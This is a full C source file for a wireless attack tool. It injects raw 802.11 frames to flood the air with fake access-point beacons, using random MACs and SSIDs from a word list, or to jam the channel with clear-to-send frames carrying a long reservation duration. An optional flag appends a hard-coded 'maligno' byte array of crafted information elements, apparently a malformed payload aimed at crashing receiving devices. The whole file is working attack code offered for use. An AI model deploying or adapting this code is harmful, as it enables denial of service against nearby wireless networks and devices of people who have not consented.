#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <time.h>
#include <linux/if_ether.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <endian.h>

struct __attribute__ ((__packed__)) radiotap {
	uint8_t revision;
	uint8_t pad;
	uint16_t length;
	uint32_t present;
};

struct __attribute__ ((__packed__)) wifi {
	uint16_t type;
	uint16_t duration;
	uint8_t raddr[ETH_ALEN];
	uint8_t saddr[ETH_ALEN];
	uint8_t bssid[ETH_ALEN];
	uint16_t fragment;
};

struct __attribute__ ((__packed__)) tlv {
	uint8_t type;
	uint8_t length;
};

struct __attribute__ ((__packed__)) mgmt {
	uint64_t timestamp;
	uint16_t interval;
	uint16_t capabilities;
};

struct __attribute__ ((__packed__)) cts {
	struct radiotap radiotap;
	uint8_t type;
	uint8_t flags;
	uint16_t duration;
	uint8_t raddr[ETH_ALEN];
};

struct __attribute__ ((__packed__)) beacon {
	struct radiotap radiotap;
	struct wifi wifi;
	struct mgmt mgmt;
	struct tlv srate;
	uint8_t srate_data[8];
	struct tlv essid;
	char essid_data[33];
};

const char maligno[] = {
	0x1a, 0x00,

	0x90, 0x4c, 0x34, 0x06, 0x05, 0x1b, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x3d, 0x16, 0x06, 0x05, 0x1b, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01,
	0x01, 0x00, 0x00, 0xff, 0x7f, 0xdd, 0x0a, 0x00,
	0x03, 0x7f, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xdd, 0x0e, 0x00, 0x50, 0xf2,

	0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44,
	0x00, 0x01, 0x02,
};

static int packets = -1;
static int male = 0;
useconds_t delay = 0;

static char ** load_words(char *path, int *lines)
{
	char **words = NULL;
	char *filecont;
	char *last;
	FILE *dict = fopen(path, "r");
	if(!dict) {
		perror("open");
		exit(1);
	}

	fseek(dict, 0L, SEEK_END);
	long len = ftell(dict);
	filecont = malloc(len);
	fseek(dict, 0L, SEEK_SET);
	if(!fread(filecont, 1, len, dict)) {
		perror("read");
		exit(1);
	}
	fclose(dict);

	*lines = 0;
	/* count and split lines */
	for(last = filecont; last; last = strchr(last, '\n')) {
		if(last != filecont)
			*last = 0;
		last++;
		(*lines)++;
	}

	/* set pointers */
	words = malloc(*lines * sizeof(*words));
	for(*lines = 0, last = filecont; last < filecont + len; ) {
		int i, l;
		if(!*last) {
			last++;
			continue;
		}
		l = strlen(last);
		for(i = 0; i < l; i++)
			if(!isalnum(last[i])) {
				last += l;
				continue;
			}
		words[(*lines)++] = last;
		last += l + 1;
	}

	return words;
}

enum attack {
	INVALID,
	BEACON,
	CTS
};

static inline void randaddr(uint8_t *addr)
{
	addr[0] = rand() & 0xfe;
	addr[1] = rand();
	addr[2] = rand();
	addr[3] = rand();
	addr[4] = rand();
	addr[5] = rand();
}

static void beaconize(int sock, char *words[], int lines)
{
	struct beacon template = {
		.radiotap.length = htole16(sizeof(struct radiotap)),
		.wifi = {
			.type = htole16(0x80),
			.raddr = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
		},
		.mgmt = {
			.interval = htole16(0x64),
			.capabilities = htole16(0x0401)
		},
		.srate = {
			.type = 0x01,
			.length = 0x08,
		},
		.srate_data = { 0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c }
	};

	while(packets) {
		char *word = words[rand() % lines];
		template.essid.length = strlen(word);

		/* maximum allowed by standard */
		if(template.essid.length > 32)
			continue;

		/* fake but valid mac address */
		randaddr(template.wifi.saddr);
		*template.wifi.bssid = *template.wifi.saddr;
		strcpy(template.essid_data, word);
		if(!male) {
			if(!write(sock, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
				exit(0);
		} else {
			int size = sizeof(template) - sizeof(template.essid_data) + template.essid.length;
			char buffer[size + sizeof(maligno)];
			memcpy(buffer, &template, size);
			memcpy(buffer + size, maligno, sizeof(maligno));
			if(!write(sock, buffer, sizeof(buffer)))
				exit(0);
		}

		if(delay)
			usleep(delay);

		if(packets > 0)
			packets--;
	}
}

static void ctsize(int sock)
{
	struct cts cts = {
		.radiotap.length = htole16(sizeof(struct radiotap)),
		.type = 0xc4,
		.duration = htole16(0x7d00)
	};
	while(packets) {
		randaddr(cts.raddr);
		if(!write(sock, &cts, sizeof(cts)))
			exit(0);

		if(delay)
			usleep(delay);

		if(packets > 0)
			packets--;
	}
}

int main(int argc, char *argv[])
{
	char c;
	int sock;
	int lines = 0;
	char **words = NULL;
	enum attack attack = INVALID;

	while((c = getopt(argc, argv, "bcf:i:p:m")) != -1) {
		switch(c) {
		case 'f':
			srand(time(NULL));
			words = load_words(optarg, &lines);
			printf("Loaded %d words\n", lines);
			break;
		case 'b':
			attack = BEACON;
			break;
		case 'c':
			attack = CTS;
			break;
		case 'i':
			delay = 1000000 / atoi(optarg);
			break;
		case 'p':
			packets = atoi(optarg);
			break;
		case 'm':
			male = 1;
			break;
		}
	}
	if(optind != argc - 1 || attack == INVALID || (attack == BEACON && !lines)) {
		fprintf(stderr, "usage: %s -b -f <file> <iface>\n", argv[0]);
		fprintf(stderr, "usage: %s -c <iface>\n", argv[0]);
		fprintf(stderr, "\noptional parameters:\n");
		fprintf(stderr, "-i interval	send `interval' packets per second\n");
		fprintf(stderr, "-p packets	send `packet' packets, then exit\n");
		return 1;
	} else {
		struct ifreq ifr = { };
		int ifl = strlen(argv[optind]);
		if(ifl > sizeof(ifr.ifr_name)) {
			fprintf(stderr, "interface name too long: %s\n", argv[optind]);
			return 1;
		}
		sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
		if(sock == -1) {
			perror("socket");
			return 1;
		}
		strncpy(ifr.ifr_name, argv[optind], ifl);
		if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1) {
			perror("SIOCGIFINDEX");
			return 1;
		}
		struct sockaddr_ll sa = {
			.sll_family = AF_PACKET,
			.sll_protocol = htons(ETH_P_ALL),
			.sll_ifindex = ifr.ifr_ifindex,
			.sll_pkttype = PACKET_HOST
		};
		bind(sock, (struct sockaddr *)&sa, sizeof(sa));
	}

	/* inject */
	switch(attack) {
	case BEACON:
		printf("beaconing on %s...\n", argv[optind]);
		beaconize(sock, words, lines);
		break;
	case CTS:
		printf("CTSing on %s...\n", argv[optind]);
		ctsize(sock);
		break;
	default:
		fprintf(stderr, "unknown attack type\n");
	}

	return 0;
}
